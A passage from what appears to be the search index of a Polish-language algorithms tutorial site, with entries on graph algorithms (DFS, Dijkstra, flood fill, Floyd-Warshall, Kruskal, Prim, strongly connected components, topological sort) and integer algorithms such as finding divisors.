Utw\u00f3rz stos S\n    2. Umie\u015b\u0107 v na stosie S\n    3. Oznacz v jako odwiedzone\n    4. Dop\u00f3ki stos S nie jest pusty, wykonuj:\n        1. Usu\u0144 pierwszy element ze stosu S i zapisz w zmiennej k\n        2. Dla ka\u017cdego wierzcho\u0142ka u s\u0105siaduj\u0105cego z k, wykonuj:\n            1. Je\u017celi u nie jest odwiedzony, to:\n                1. Oznacz u jako odwiedzony\n                2. Umie\u015b\u0107 u na stosie S\n</code></pre>"},{"location":"algorithms/graphs/dfs/#zastosowania","title":"Zastosowania","text":"<p>DFS ma wiele zastosowa\u0144 w praktyce, mi\u0119dzy innymi:</p> <ul> <li>Wyszukiwanie elementu w grafie.</li> <li>Sprawdzanie, czy graf jest sp\u00f3jny.</li> <li>Wyszukiwanie cykli w grafie.</li> <li>Rozwi\u0105zywanie problem\u00f3w takich jak problem labiryntu, problem \u015bcie\u017cki Hamiltona itp.</li> <li>Tworzenie drzewa rozpinaj\u0105cego dla grafu nieskierowanego.</li> </ul>"},{"location":"algorithms/graphs/dfs/#zozonosc-obliczeniowa","title":"Z\u0142o\u017cono\u015b\u0107 obliczeniowa","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa algorytmu DFS wynosi \\(O(V + E)\\), gdzie \\(V\\) to liczba wierzcho\u0142k\u00f3w, a \\(E\\) to liczba kraw\u0119dzi, poniewa\u017c ka\u017cdy wierzcho\u0142ek i ka\u017cda kraw\u0119d\u017a s\u0105 przeszukiwane dok\u0142adnie raz.</p>"},{"location":"algorithms/graphs/dfs/#implementacja","title":"Implementacja","text":"<p>Algorytm DFS mo\u017cna zaimplementowa\u0107 za pomoc\u0105 struktury danych stosu. Stos jest u\u017cywany do \u015bledzenia wierzcho\u0142k\u00f3w, kt\u00f3re s\u0105 jeszcze do odwiedzenia. Na pocz\u0105tku algorytmu wrzucamy na stos wierzcho\u0142ek startowy. Algorytm kontynuuje przeszukiwanie, zdejmuj\u0105c wierzcho\u0142ek ze stosu i dodaj\u0105c wszystkie nieodwiedzone jeszcze s\u0105siaduj\u0105ce wierzcho\u0142ki na stos. Operacje powtarzamy, a\u017c stos b\u0119dzie pusty. Zamiast stosu mo\u017cna tak\u017ce skorzysta\u0107 z rekurencji.</p> <p>Poni\u017cej znajdziesz przyk\u0142adowe implementacje w wybranych j\u0119zykach.</p>"},{"location":"algorithms/graphs/dfs/#c","title":"C++","text":""},{"location":"algorithms/graphs/dfs/#python","title":"Python","text":""},{"location":"algorithms/graphs/dijkstra/","title":"Dijkstra","text":"<p>Algorytm Dijkstry jest jednym z najpopularniejszych algorytm\u00f3w s\u0142u\u017c\u0105cych do szukania najkr\u00f3tszej \u015bcie\u017cki w grafie. Zosta\u0142 on opracowany przez holenderskiego informatyka Edsgera Dijkstr\u0119 w 1956 roku. Algorytm ten jest szczeg\u00f3lnie przydatny w sieciach komunikacyjnych, gdzie s\u0142u\u017cy do znajdowania najkr\u00f3tszej \u015bcie\u017cki od \u017ar\u00f3d\u0142owego w\u0119z\u0142a do wszystkich innych w\u0119z\u0142\u00f3w w sieci.</p> <p>Algorytm Dijkstry mo\u017ce by\u0107 u\u017cywany tylko w grafach wa\u017conych (w grafach niewa\u017conych mo\u017cemy przyj\u0105\u0107 wag\u0119 \\(1\\) dla ka\u017cdej kraw\u0119dzi), gdzie wagi reprezentuj\u0105 d\u0142ugo\u015b\u0107 lub koszt przej\u015bcia mi\u0119dzy wierzcho\u0142kami. Wa\u017cne jest, \u017ce wagi nie mog\u0105 by\u0107 ujemne, poniewa\u017c w takim przypadku algorytm Dijkstry mo\u017ce nie dzia\u0142a\u0107 poprawnie.</p>"},{"location":"algorithms/graphs/dijkstra/#opis-algorytmu","title":"Opis algorytmu","text":"<ol> <li>Inicjalizacja: Na pocz\u0105tku ustawiamy warto\u015b\u0107 odleg\u0142o\u015bci do wierzcho\u0142ka startowego na \\(0\\), a dla wszystkich pozosta\u0142ych wierzcho\u0142k\u00f3w na niesko\u0144czono\u015b\u0107 (lub bardzo du\u017c\u0105 liczb\u0119).</li> <li>Tworzymy zbi\u00f3r nienaruszonych wierzcho\u0142k\u00f3w, na pocz\u0105tku zawieraj\u0105cy wszystkie wierzcho\u0142ki grafu.</li> <li>Wybieramy wierzcho\u0142ek z najmniejsz\u0105 odleg\u0142o\u015bci\u0105 spo\u015br\u00f3d nienaruszonych wierzcho\u0142k\u00f3w, a nast\u0119pnie usuwamy go ze zbioru.</li> <li>Aktualizujemy odleg\u0142o\u015bci do wszystkich s\u0105siad\u00f3w wybranego wierzcho\u0142ka. Je\u017celi aktualna odleg\u0142o\u015b\u0107 do s\u0105siada jest wi\u0119ksza ni\u017c odleg\u0142o\u015b\u0107 do wybranego wierzcho\u0142ka plus waga kraw\u0119dzi mi\u0119dzy nimi, to aktualizujemy odleg\u0142o\u015b\u0107 do s\u0105siada.</li> <li>Powtarzamy kroki \\(3\\) i \\(4\\), dop\u00f3ki zbi\u00f3r nienaruszonych wierzcho\u0142k\u00f3w nie jest pusty.</li> </ol> <p>Na koniec algorytmu, dla ka\u017cdego wierzcho\u0142ka mamy najkr\u00f3tsz\u0105 mo\u017cliw\u0105 odleg\u0142o\u015b\u0107 od wierzcho\u0142ka startowego.</p>"},{"location":"algorithms/graphs/dijkstra/#zozonosc-obliczeniowa","title":"Z\u0142o\u017cono\u015b\u0107 obliczeniowa","text":"<p>Z\u0142o\u017cono\u015b\u0107 obliczeniowa algorytmu Dijkstry zale\u017cy od implementacji. Je\u015bli algorytm jest zaimplementowany z u\u017cyciem prostej kolejki, jego z\u0142o\u017cono\u015b\u0107 obliczeniowa wynosi \\(O(V^2)\\), gdzie \\(V\\) to liczba wierzcho\u0142k\u00f3w w grafie. Je\u017celi u\u017cywamy kopca binarnego do przechowywania nienaruszonych wierzcho\u0142k\u00f3w, z\u0142o\u017cono\u015b\u0107 obliczeniowa wynosi \\(O((V+E) \\log{V})\\), gdzie \\(E\\) to liczba kraw\u0119dzi w grafie.</p>"},{"location":"algorithms/graphs/dijkstra/#podsumowanie","title":"Podsumowanie","text":"<p>Algorytm Dijkstry jest podstawowym narz\u0119dziem do rozwi\u0105zywania problem\u00f3w zwi\u0105zanych z najkr\u00f3tsz\u0105 \u015bcie\u017ck\u0105 w grafach wa\u017conych bez ujemnych wag. Pomimo swojego wieku, nadal jest powszechnie stosowany w wielu dziedzinach, od sieci komputerowych po systemy nawigacji GPS.</p>"},{"location":"algorithms/graphs/dijkstra/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/dijkstra/#c","title":"C++","text":""},{"location":"algorithms/graphs/dijkstra/#python","title":"Python","text":""},{"location":"algorithms/graphs/flood-fill/","title":"Flood fill","text":"<p>Algorytm Flood Fill jest technik\u0105 u\u017cywan\u0105 do wype\u0142niania po\u0142\u0105czonych, podobnych kolorami obszar\u00f3w w dwuwymiarowej siatce lub obrazie. Jest cz\u0119sto u\u017cywany w narz\u0119dziach graficznych, takich jak programy do tworzenia obraz\u00f3w i gier, do wype\u0142niania zamkni\u0119tych obszar\u00f3w kolorem lub wzorem.</p>"},{"location":"algorithms/graphs/flood-fill/#opis-algorytmu","title":"Opis algorytmu","text":"<p>Algorytm Flood Fill rozpoczyna dzia\u0142anie od danego punktu (nazywanego \"\u017ar\u00f3d\u0142em\") i nast\u0119pnie \"zalewa\" obszar wok\u00f3\u0142 \u017ar\u00f3d\u0142a, przechodz\u0105c do s\u0105siednich punkt\u00f3w, kt\u00f3re s\u0105 tego samego koloru, i zmieniaj\u0105c je na kolor \"wype\u0142nienia\". Proces ten kontynuowany jest, a\u017c ca\u0142y obszar zostanie wype\u0142niony.</p> <p>Najpopularniejszymi wariantami algorytmu Flood Fill s\u0105:</p> <ul> <li>Algorytm czteros\u0105siadowy (Four-Connected): Przechodzi do s\u0105siad\u00f3w na g\u00f3rze, na dole, na lewo i na prawo od danego punktu.</li> <li>Algorytm o\u015bmios\u0105siadowy (Eight-Connected): Przechodzi do s\u0105siad\u00f3w na g\u00f3rze, na dole, na lewo, na prawo, a tak\u017ce do czterech s\u0105siad\u00f3w po przek\u0105tnych.</li> </ul>"},{"location":"algorithms/graphs/flood-fill/#przykad-1-wariant-czterosasiadowy","title":"Przyk\u0142ad 1 - wariant czteros\u0105siadowy","text":""},{"location":"algorithms/graphs/flood-fill/#przykad-2-wariant-osmiosasiadowy","title":"Przyk\u0142ad 2 - wariant o\u015bmios\u0105siadowy","text":""},{"location":"algorithms/graphs/flood-fill/#pseudokod-wariant-czterosasiadowy","title":"Pseudokod - wariant czteros\u0105siadowy","text":"<pre><code>funkcja FloodFill(x, y, staryKolor, nowyKolor, obraz):\n    1. Je\u017celi pole (x, y) znajduje si\u0119 poza obszarem (obrazu), to:\n        2. Zako\u0144cz\n\n    3. Je\u017celi obraz[x][y] != staryKolor, to:\n        4. Zako\u0144cz \n\n    5. obraz[x][y] = nowyKolor\n\n    6. FloodFill(x + 1, y, staryKolor, nowyKolor, obraz)\n    7. FloodFill(x - 1, y, staryKolor, nowyKolor, obraz)\n    8. FloodFill(x, y + 1, staryKolor, nowyKolor, obraz)\n    9. FloodFill(x, y - 1, staryKolor, nowyKolor, obraz)\n</code></pre> <p>Pami\u0119taj, \u017ce powy\u017cszy pseudokod jest rekurencyjny i mo\u017ce prowadzi\u0107 do przekroczenia limitu g\u0142\u0119boko\u015bci stosu w przypadku bardzo du\u017cych obszar\u00f3w. Istniej\u0105 jednak techniki, takie jak algorytm z u\u017cyciem stosu lub kolejki, kt\u00f3re pozwalaj\u0105 unikn\u0105\u0107 tego problemu.</p>"},{"location":"algorithms/graphs/flood-fill/#zozonosc-obliczeniowa","title":"Z\u0142o\u017cono\u015b\u0107 obliczeniowa","text":"<p>Z\u0142o\u017cono\u015b\u0107 obliczeniowa algorytmu Flood Fill to \\(O(n)\\), gdzie \\(n\\) to liczba pikseli, kt\u00f3re musz\u0105 zosta\u0107 zmienione. W praktyce wydajno\u015b\u0107 algorytmu zale\u017cy od wielu czynnik\u00f3w, takich jak wielko\u015b\u0107 obszaru do wype\u0142nienia, kszta\u0142t obszaru i wybrana strategia (np. czteros\u0105siadowa czy o\u015bmios\u0105siadowa).</p>"},{"location":"algorithms/graphs/flood-fill/#podsumowanie","title":"Podsumowanie","text":"<p>Algorytm Flood Fill to podstawowe narz\u0119dzie w grafice komputerowej, u\u017cywane do wype\u0142niania zamkni\u0119tych obszar\u00f3w kolorem lub wzorem. Jest \u0142atwy do zrozumienia i implementacji, a jego efektywno\u015b\u0107 mo\u017cna znacznie poprawi\u0107 za pomoc\u0105 r\u00f3\u017cnych technik, takich jak stosy czy kolejki.</p>"},{"location":"algorithms/graphs/flood-fill/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/flood-fill/#c","title":"C++","text":""},{"location":"algorithms/graphs/flood-fill/#python","title":"Python","text":""},{"location":"algorithms/graphs/floyd-warshall/","title":"Floyd-Warshall","text":"<p>Algorytm Floyda-Warshalla to algorytm wykorzystywany do znalezienia najkr\u00f3tszych \u015bcie\u017cek mi\u0119dzy wszystkimi parami wierzcho\u0142k\u00f3w w grafie skierowanym wa\u017conym. Algorytm ten jest zdolny do obs\u0142ugi graf\u00f3w z ujemnymi kraw\u0119dziami, ale nie z ujemnymi cyklami.</p>"},{"location":"algorithms/graphs/floyd-warshall/#opis-algorytmu","title":"Opis algorytmu","text":"<p>Floyd-Warshall korzysta z zasady optymalno\u015bci Bellmana, kt\u00f3ra m\u00f3wi, \u017ce najkr\u00f3tsza \u015bcie\u017cka mi\u0119dzy dwoma wierzcho\u0142kami jest albo bezpo\u015bredni\u0105 \u015bcie\u017ck\u0105 mi\u0119dzy nimi, albo zawiera pewne inne wierzcho\u0142ki. Dlatego algorytm Floyda-Warshalla dzia\u0142a poprzez por\u00f3wnywanie wszystkich mo\u017cliwych \u015bcie\u017cek mi\u0119dzy wszystkimi parami wierzcho\u0142k\u00f3w i aktualizowanie najkr\u00f3tszych \u015bcie\u017cek, gdy znajdzie kr\u00f3tsz\u0105 alternatyw\u0119.</p>"},{"location":"algorithms/graphs/floyd-warshall/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja FloydWarshall(G, V):   (G - graf, V - liczba wierzcho\u0142k\u00f3w w grafie, numerowanych od jedynki)\n    1. Utw\u00f3rz dwuwymiarow\u0105 tablic\u0119 dist[1..V][1..V]\n    2. Wype\u0142nij tablic\u0119 dist warto\u015bci\u0105 inf reprezentuj\u0105c\u0105 niesko\u0144czono\u015b\u0107\n    3. Dla i := 1 do V, wykonuj:\n        4. dist[i][i] := 0\n    5. Dla ka\u017cdej kraw\u0119dzi (u, v) w grafie, wykonuj:\n        6. dist[u][v] := waga kraw\u0119dzi (u, v)\n    7. Dla k := 1 do V, wykonuj:\n        8. Dla i := 1 do V, wykonuj:\n            9. Dla j := 1 do V, wykonuj:\n                10. Je\u017celi dist[i][j] &gt; dist[i][k] + dist[k][j], to:\n                    11. dist[i][j] := dist[i][k] + dist[k][j]\n</code></pre>"},{"location":"algorithms/graphs/floyd-warshall/#zozonosc-obliczeniowa","title":"Z\u0142o\u017cono\u015b\u0107 obliczeniowa","text":"<p>Algorytm Floyda-Warshalla ma z\u0142o\u017cono\u015b\u0107 czasow\u0105 \\(O(V^3)\\), gdzie \\(V\\) to liczba wierzcho\u0142k\u00f3w w grafie. Jest to wynik trzykrotnego zagnie\u017cd\u017cania p\u0119tli, gdzie ka\u017cda p\u0119tla przechodzi przez wszystkie wierzcho\u0142ki.</p>"},{"location":"algorithms/graphs/floyd-warshall/#zastosowania","title":"Zastosowania","text":"<p>Algorytm Floyda-Warshalla jest u\u017cywany w sieciach komputerowych do routingu, jak r\u00f3wnie\u017c w operacjach badawczych do problemu najkr\u00f3tszej \u015bcie\u017cki. W praktyce jest cz\u0119sto stosowany tam, gdzie mamy do czynienia z niewielk\u0105 liczb\u0105 wierzcho\u0142k\u00f3w, lub gdy potrzebujemy najkr\u00f3tszych \u015bcie\u017cek mi\u0119dzy wszystkimi parami wierzcho\u0142k\u00f3w, a nie tylko mi\u0119dzy pojedyncz\u0105 par\u0105 wierzcho\u0142k\u00f3w.</p>"},{"location":"algorithms/graphs/floyd-warshall/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/floyd-warshall/#c","title":"C++","text":""},{"location":"algorithms/graphs/floyd-warshall/#python","title":"Python","text":""},{"location":"algorithms/graphs/kruskal/","title":"Kruskal","text":"<p>Algorytm Kruskala jest algorytmem wyznaczania minimalnego drzewa rozpinaj\u0105cego w grafie nieskierowanym wa\u017conym. Jest to jeden z najprostszych algorytm\u00f3w do rozwi\u0105zania tego problemu. Zosta\u0142 nazwany na cze\u015b\u0107 swojego tw\u00f3rcy, J\u00f3zefa Kruskala, kt\u00f3ry opublikowa\u0142 go po raz pierwszy w 1956 roku.</p>"},{"location":"algorithms/graphs/kruskal/#opis-algorytmu","title":"Opis algorytmu","text":"<ol> <li>Sortujemy wszystkie kraw\u0119dzie grafu wed\u0142ug rosn\u0105cych wag.</li> <li>Przegl\u0105damy kraw\u0119dzie w kolejno\u015bci od najmniejszej do najwi\u0119kszej. Je\u017celi kraw\u0119d\u017a \u0142\u0105czy dwa r\u00f3\u017cne drzewa (na pocz\u0105tku ka\u017cdy wierzcho\u0142ek jest traktowany jako osobne drzewo), to dodajemy j\u0105 do minimalnego drzewa rozpinaj\u0105cego i \u0142\u0105czymy dwa drzewa w jedno. W przeciwnym razie pomijamy kraw\u0119d\u017a.</li> <li>Powtarzamy krok \\(2\\) a\u017c do momentu, gdy wszystkie wierzcho\u0142ki b\u0119d\u0105 w jednym drzewie, kt\u00f3re b\u0119dzie minimalnym drzewem rozpinaj\u0105cym.</li> </ol> <p>Algorytm Kruskala korzysta z w\u0142asno\u015bci, \u017ce kraw\u0119d\u017a o najmniejszej wadze, kt\u00f3ra \u0142\u0105czy dwa r\u00f3\u017cne drzewa, jest zawsze cz\u0119\u015bci\u0105 minimalnego drzewa rozpinaj\u0105cego.</p>"},{"location":"algorithms/graphs/kruskal/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Algorytm Kruskala ma z\u0142o\u017cono\u015b\u0107 czasow\u0105 \\(O(E \\log E)\\), gdzie \\(E\\) jest liczb\u0105 kraw\u0119dzi w grafie. Jest to wynik potrzeby posortowania kraw\u0119dzi na pocz\u0105tku algorytmu.</p>"},{"location":"algorithms/graphs/kruskal/#zastosowania","title":"Zastosowania","text":"<p>Podobnie jak algorytm Prima, algorytm Kruskala ma wiele zastosowa\u0144, szczeg\u00f3lnie tam, gdzie trzeba optymalnie po\u0142\u0105czy\u0107 r\u00f3\u017cne punkty, np. w problemach komunikacyjnych i sieciowych.</p>"},{"location":"algorithms/graphs/kruskal/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/kruskal/#c","title":"C++","text":""},{"location":"algorithms/graphs/kruskal/#python","title":"Python","text":""},{"location":"algorithms/graphs/prim/","title":"Prim","text":"<p>Algorytm Prima jest jednym z algorytm\u00f3w wyznaczaj\u0105cych minimalne drzewo rozpinaj\u0105ce dla danego grafu nieskierowanego i wa\u017conego. Algorytm zosta\u0142 nazwany na cze\u015b\u0107 Roberta C. Prima, kt\u00f3ry opisa\u0142 go w 1957 roku.</p>"},{"location":"algorithms/graphs/prim/#opis-algorytmu","title":"Opis algorytmu","text":"<ol> <li>Wybierz dowolny wierzcho\u0142ek w grafie jako punkt startowy.</li> <li>Ze wszystkich kraw\u0119dzi, kt\u00f3re \u0142\u0105cz\u0105 wierzcho\u0142ki ju\u017c uwzgl\u0119dnione w drzewie rozpinaj\u0105cym z wierzcho\u0142kami spoza tego drzewa, wybierz t\u0119 o najmniejszej wadze.</li> <li>Dodaj wybran\u0105 kraw\u0119d\u017a oraz wierzcho\u0142ek, do kt\u00f3rego prowadzi, do drzewa rozpinaj\u0105cego.</li> <li>Powtarzaj kroki 2-3, a\u017c wszystkie wierzcho\u0142ki grafu zostan\u0105 uwzgl\u0119dnione w drzewie rozpinaj\u0105cym.</li> </ol>"},{"location":"algorithms/graphs/prim/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa algorytmu Prima zale\u017cy od implementacji. Przy u\u017cyciu kolejki priorytetowej zaimplementowanej jako kopiec binarny, algorytm dzia\u0142a w czasie \\(O(E log V)\\), gdzie \\(E\\) to liczba kraw\u0119dzi, a \\(V\\) to liczba wierzcho\u0142k\u00f3w w grafie. Mo\u017cliwe s\u0105 jednak efektywniejsze implementacje.</p>"},{"location":"algorithms/graphs/prim/#zastosowania","title":"Zastosowania","text":"<p>Algorytm Prima jest u\u017cywany w wielu praktycznych zastosowaniach, na przyk\u0142ad do projektowania sieci komputerowych i telekomunikacyjnych, gdzie celem jest po\u0142\u0105czenie wielu punkt\u00f3w najmniejsz\u0105 mo\u017cliw\u0105 ilo\u015bci\u0105 kabla.</p> <p>Ponadto, jest stosowany w algorytmach kompresji danych, takich jak algorytm kodowania Huffmana, kt\u00f3ry tworzy minimalne drzewo rozpinaj\u0105ce w celu reprezentowania danych w najbardziej efektywny spos\u00f3b.</p>"},{"location":"algorithms/graphs/prim/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/prim/#c","title":"C++","text":""},{"location":"algorithms/graphs/prim/#python","title":"Python","text":""},{"location":"algorithms/graphs/strongly-connected-components/","title":"Silnie sp\u00f3jne sk\u0142adowe","text":"<p>Silnie sp\u00f3jna sk\u0142adowa grafu skierowanego to taka cz\u0119\u015b\u0107 grafu, gdzie z ka\u017cdego wierzcho\u0142ka do ka\u017cdego innego mo\u017cna doj\u015b\u0107 po \u015bcie\u017cce skierowanej, kt\u00f3ra jest wewn\u0105trz tej sk\u0142adowej. M\u00f3wi\u0105c pro\u015bciej, w silnie sp\u00f3jnej sk\u0142adowej mo\u017cemy doj\u015b\u0107 z dowolnego wierzcho\u0142ka do dowolnego innego, id\u0105c tylko w kierunku strza\u0142ek (kraw\u0119dzi).</p>"},{"location":"algorithms/graphs/strongly-connected-components/#algorytm-kosaraju","title":"Algorytm Kosaraju","text":"<p>Algorytm Kosaraju jest popularnym algorytmem do znajdowania silnie sp\u00f3jnych sk\u0142adowych w grafie skierowanym. Sk\u0142ada si\u0119 on z trzech krok\u00f3w:</p> <ol> <li>Wykonujemy przeszukiwanie w g\u0142\u0105b na oryginalnym grafie. Zapisujemy kolejno\u015b\u0107 odwiedzania wierzcho\u0142k\u00f3w.</li> <li>Odwracamy kierunek wszystkich kraw\u0119dzi w grafie.</li> <li>Wykonujemy przeszukiwanie w g\u0142\u0105b na odwr\u00f3conym grafie, ale zaczynamy od wierzcho\u0142ka, kt\u00f3ry by\u0142 odwiedzany jako ostatni w pierwszym przeszukiwaniu. Wszystkie wierzcho\u0142ki odwiedzone podczas tego przeszukiwania tworz\u0105 jedn\u0105 silnie sp\u00f3jn\u0105 sk\u0142adow\u0105. Nast\u0119pnie wybieramy kolejny jeszcze nieodwiedzony wierzcho\u0142ek, kt\u00f3ry by\u0142 odwiedzany jako ostatni w pierwszym przeszukiwaniu, i powtarzamy przeszukiwanie, co daje nam kolejn\u0105 silnie sp\u00f3jn\u0105 sk\u0142adow\u0105. Proces kontynuujemy, a\u017c odwiedzimy wszystkie wierzcho\u0142ki.</li> </ol>"},{"location":"algorithms/graphs/strongly-connected-components/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 obliczeniowa algorytmu Kosaraju wynosi \\(O(V + E)\\), gdzie \\(V\\) to liczba wierzcho\u0142k\u00f3w, a \\(E\\) to liczba kraw\u0119dzi w grafie. Jest to wynik tego, \u017ce algorytm wykonuje dwa przeszukiwania w g\u0142\u0105b.</p>"},{"location":"algorithms/graphs/strongly-connected-components/#zastosowania","title":"Zastosowania","text":"<p>Silnie sp\u00f3jne sk\u0142adowe s\u0105 u\u017cywane w wielu r\u00f3\u017cnych dziedzinach informatyki, w tym w analizie sieci spo\u0142eczno\u015bciowych, planowaniu tras, analizie stron internetowych i wiele innych.</p>"},{"location":"algorithms/graphs/strongly-connected-components/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/strongly-connected-components/#c","title":"C++","text":""},{"location":"algorithms/graphs/strongly-connected-components/#python","title":"Python","text":""},{"location":"algorithms/graphs/topological-sort/","title":"Sortowanie topologiczne","text":"<p>Sortowanie topologiczne to procedura, kt\u00f3ra dla danego skierowanego grafu acyklicznego (DAG), zwraca liniowy porz\u0105dek wierzcho\u0142k\u00f3w taki, \u017ce dla ka\u017cdej kraw\u0119dzi skierowanej od wierzcho\u0142ka \\(u\\) do \\(v\\), \\(u\\) jest przed \\(v\\) w porz\u0105dku.</p> <p>M\u00f3wi\u0105c pro\u015bciej, sortowanie topologiczne danego grafu acyklicznego to liniowe uporz\u0105dkowanie wierzcho\u0142k\u00f3w takie, \u017ce je\u017celi istnieje kraw\u0119d\u017a od wierzcho\u0142ka \\(u\\) do \\(v\\), to \\(u\\) pojawia si\u0119 przed \\(v\\) w porz\u0105dkowaniu.</p>"},{"location":"algorithms/graphs/topological-sort/#opis-dziaania-algorytmu","title":"Opis dzia\u0142ania algorytmu","text":"<p>Jednym z podstawowych algorytm\u00f3w sortowania topologicznego jest algorytm oparty na przeszukiwaniu w g\u0142\u0105b (DFS). Lista krok\u00f3w tego algorytmu mo\u017ce wygl\u0105da\u0107 nast\u0119puj\u0105co:</p> <ol> <li>Tworzymy stos, kt\u00f3ry b\u0119dzie przechowywa\u0142 posortowane topologicznie wierzcho\u0142ki.</li> <li>Dla ka\u017cdego wierzcho\u0142ka, kt\u00f3ry nie zosta\u0142 jeszcze odwiedzony, wykonujemy operacj\u0119 DFS.</li> <li>Podczas operacji DFS, po odwiedzeniu wszystkich s\u0105siad\u00f3w danego wierzcho\u0142ka, umieszczamy ten wierzcho\u0142ek na stosie.</li> <li>Po zako\u0144czeniu operacji DFS dla wszystkich wierzcho\u0142k\u00f3w, stos zawiera wierzcho\u0142ki posortowane topologicznie. Wierzcho\u0142ki s\u0105 poprawnie posortowane, gdy usuwamy je ze stosu od g\u00f3ry.</li> </ol>"},{"location":"algorithms/graphs/topological-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Z\u0142o\u017cono\u015b\u0107 czasowa tego algorytmu to \\(O(V+E)\\), gdzie \\(V\\) to liczba wierzcho\u0142k\u00f3w, a \\(E\\) to liczba kraw\u0119dzi w grafie, co wynika bezpo\u015brednio z z\u0142o\u017cono\u015bci przeszukiwania w g\u0142\u0105b.</p>"},{"location":"algorithms/graphs/topological-sort/#zastosowanie","title":"Zastosowanie","text":"<p>Sortowanie topologiczne ma wiele zastosowa\u0144, szczeg\u00f3lnie w dziedzinach, kt\u00f3re wymagaj\u0105 okre\u015blonego porz\u0105dku zada\u0144. Jest u\u017cywane do okre\u015blania sekwencji zada\u0144, planowania projekt\u00f3w, budowy plan\u00f3w zaj\u0119\u0107, rozwi\u0105zywania problem\u00f3w zale\u017cno\u015bci mi\u0119dzy zadaniami i wiele innych.</p>"},{"location":"algorithms/graphs/topological-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/graphs/topological-sort/#c","title":"C++","text":""},{"location":"algorithms/graphs/topological-sort/#python","title":"Python","text":""},{"location":"algorithms/integers/","title":"Algorytmy na liczbach ca\u0142kowitych","text":"<p>Algorytmy na liczbach ca\u0142kowitych stanowi\u0105 kluczowy obszar w informatyce i matematyce dyskretnej, kt\u00f3ry skupia si\u0119 na operacjach i manipulacjach na liczbach ca\u0142kowitych. W praktyce wiele problem\u00f3w algorytmicznych mo\u017ce by\u0107 zredukowanych do operacji na liczbach ca\u0142kowitych, co czyni ten temat niezwykle istotnym.</p> <p>Poni\u017cej znajdziesz kilka kluczowych koncepcji i algorytm\u00f3w zwi\u0105zanych z liczbami ca\u0142kowitymi:</p> <ol> <li>Dzia\u0142ania na liczbach ca\u0142kowitych: Najbardziej podstawowe operacje na liczbach ca\u0142kowitych to dodawanie, odejmowanie, mno\u017cenie i dzielenie. Te operacje s\u0105 wykorzystywane w wi\u0119kszo\u015bci algorytm\u00f3w i s\u0105 zazwyczaj wbudowane w wi\u0119kszo\u015b\u0107 j\u0119zyk\u00f3w programowania.</li> <li>Algorytmy dzielenia i reszty z dzielenia: Wiele algorytm\u00f3w, takich jak algorytm Euklidesa do znajdowania najwi\u0119kszego wsp\u00f3lnego dzielnika dw\u00f3ch liczb, opiera si\u0119 na operacji dzielenia z reszt\u0105.</li> <li>Algorytmy modulo i pot\u0119gowanie: Operacje modulo (reszta z dzielenia) s\u0105 niezwykle u\u017cyteczne w wielu algorytmach, takich jak te u\u017cywane w kryptografii. Pot\u0119gowanie, zw\u0142aszcza pot\u0119gowanie modulo, jest r\u00f3wnie\u017c kluczowe w wielu zastosowaniach.</li> <li>Algorytmy do obliczania liczb pierwszych: Istnieje wiele algorytm\u00f3w, kt\u00f3re mog\u0105 by\u0107 u\u017cywane do obliczania liczb pierwszych, takich jak sito Eratostenesa, czy algorytm Millera-Rabina do testowania pierwszo\u015bci.</li> <li>Algorytmy na bitach: Operacje na bitach, takie jak przesuni\u0119cia bitowe, koniunkcja, alternatywa, czy negacja, s\u0105 niezwykle u\u017cyteczne w algorytmach dzia\u0142aj\u0105cych na liczbach ca\u0142kowitych. S\u0105 cz\u0119sto wykorzystywane w celu optymalizacji wydajno\u015bci.</li> <li>Algorytmy na ci\u0105gach liczbowych: Istnieje wiele algorytm\u00f3w skupiaj\u0105cych si\u0119 na operacjach na ci\u0105gach liczb, takich jak szukanie najwi\u0119kszej lub najmniejszej liczby, szukanie mediany, czy sortowanie.</li> </ol> <p>Wszystkie te zagadnienia wymagaj\u0105 dobrej znajomo\u015bci podstaw matematyki dyskretnej, struktur danych i z\u0142o\u017cono\u015bci obliczeniowej.</p>"},{"location":"algorithms/integers/divisors/","title":"Wszystkie dzielniki","text":"<p>Czasem bywa tak, \u017ce potrzebujemy pozna\u0107 wszystkie dzielniki zadanej liczby. Dzielnik to warto\u015b\u0107, przez kt\u00f3r\u0105 liczba jest podzielna, czy te\u017c m\u00f3wi\u0105c inaczej, dzieli si\u0119 bez reszty.</p> <p>Zadanie to jest stosunkowo proste, nale\u017cy jednak zada\u0107 sobie pytanie: jakie liczby musimy sprawdzi\u0107, by znale\u017a\u0107 wszystkie dzielniki? Jak zobaczymy, odpowied\u017a nie jest taka oczywista i do tego problemu mo\u017cna podej\u015b\u0107 na kilka sposob\u00f3w. Zanim jednak przejdziemy do rozwi\u0105za\u0144, zacznijmy od formalnej specyfikacji problemu i prostego przyk\u0142adu.</p>"},{"location":"algorithms/integers/divisors/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/divisors/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, wi\u0119ksza od zera</li> </ul>"},{"location":"algorithms/integers/divisors/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie dzielniki liczby \\(n\\) </li> </ul>"},{"location":"algorithms/integers/divisors/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/integers/divisors/#dane_1","title":"Dane","text":"<pre><code>n := 12\n</code></pre> <p>Wynik: \\(1,2,3,4,6,12\\) </p>"},{"location":"algorithms/integers/divisors/#rozwiazanie-zupenie-naiwne","title":"Rozwi\u0105zanie zupe\u0142nie naiwne","text":"<p>Przejd\u017amy do pr\u00f3by rozwi\u0105zania problemu. Naszym zadaniem jest wypisa\u0107 wszystkie dzielniki podanej warto\u015bci. Nie mo\u017cemy \u017cadnego pomin\u0105\u0107. Spr\u00f3bujmy wi\u0119c odpowiedzie\u0107 na postawione 